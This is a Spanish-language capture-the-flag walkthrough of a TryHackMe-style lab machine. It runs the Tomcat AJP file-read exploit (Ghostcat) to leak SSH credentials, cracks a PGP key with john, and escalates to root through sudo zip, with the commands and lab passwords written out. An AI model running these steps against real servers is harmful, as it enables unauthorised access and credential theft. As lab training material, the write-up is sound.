Hacemos el escaneo de nmap:
![[Pasted image 20230816112121.png]]
Vamos a ver la web que corre por el puerto 8080; y se trata de un tomcat donde vemos la versión:
![[Pasted image 20230816112215.png]]
Si miramos por internet, vemos que tenemos un exploit para esta versión:
![[Pasted image 20230816112319.png]]
Y aquí tenemos la PoC:
![[Pasted image 20230816112501.png]]
Que nos lleva a este otro repositorio:
![[Pasted image 20230816112516.png]]
Nos descargamos el exploit:
![[Pasted image 20230816112539.png]]
Vemos en las instrucciones del exploit como usarlo, donde parece que podremos leer archivos internos de la máquina:
![[Pasted image 20230816112650.png]]
Ejecutamos el comando exactamente igual a como vemos en las instrucciones:
```bash
python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f WEB-INF/web.xml 10.10.71.74
```
Y nos devuelve unas credenciales ssh:
```bash
skyfuck:8730281lkjlkjdqlksalks
```
![[Pasted image 20230816113647.png]]
Y conseguimos entrar:
![[Pasted image 20230816123654.png]]
Dentro de este mismo directorio nos encontramos con dos archivos, donde el .asc es la clave que debo importar para abrir el credential.pgp:
![[Pasted image 20230816123818.png]]
Una de ellas que podemos romper con john the ripper:
![[Pasted image 20230816123850.png]]
Nos traemos ambos archivos a nuestra máquina local utilizando scp para enviárnoslo vía ssh:
```bash
scp skyfuck@10.10.101.24:credential.pgp .
scp skyfuck@10.10.101.24:tryhackme.asc .
```
![[Pasted image 20230816124241.png]]
Ahora debemos ejecutar gpg2john del fichero tryhackme.asc para extraer el hash y poder crackearlo:
```bash
gpg2john tryhackme.asc >> hash
```
![[Pasted image 20230816124513.png]]
Y ahora si hacemos un ataque de fuerza bruta, vemos que nos extrae la contraseña, la cual es alexandru:
![[Pasted image 20230816124606.png]]
Y ahora que ya tenemos la contraseña para desencriptar el tryhackme.asc, ya podemos usarla para abrir el credential.gpg, donde debemos de ejecutar los siguientes comandos:
```bash
gpg --decrypt credential.pgp # Esto dará error.
gpg --import tryhackme.asc # Importamos la clave.
gpg --decrypt credential.pgp # Ahora ya no dará error.
```
![[Pasted image 20230816124823.png]]
Y el resultado es el siguiente:
```bash
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```
Al tener la contraseña del usuario merlin, podemos acceder a él:
![[Pasted image 20230816124949.png]]
Y siendo este usuario vemos que podemos ejecutar zip como root:
![[Pasted image 20230816125011.png]]
Por tanto, miramos en gtfobins y vemos esto al buscar por el binario zip:
![[Pasted image 20230816125036.png]]
Ejecutamos la primera y segunda línea y ya somos root:
![[Pasted image 20230816125200.png]]
Con el comando find buscamos las flags de user y root y las encontramos:
![[Pasted image 20230816125323.png]]
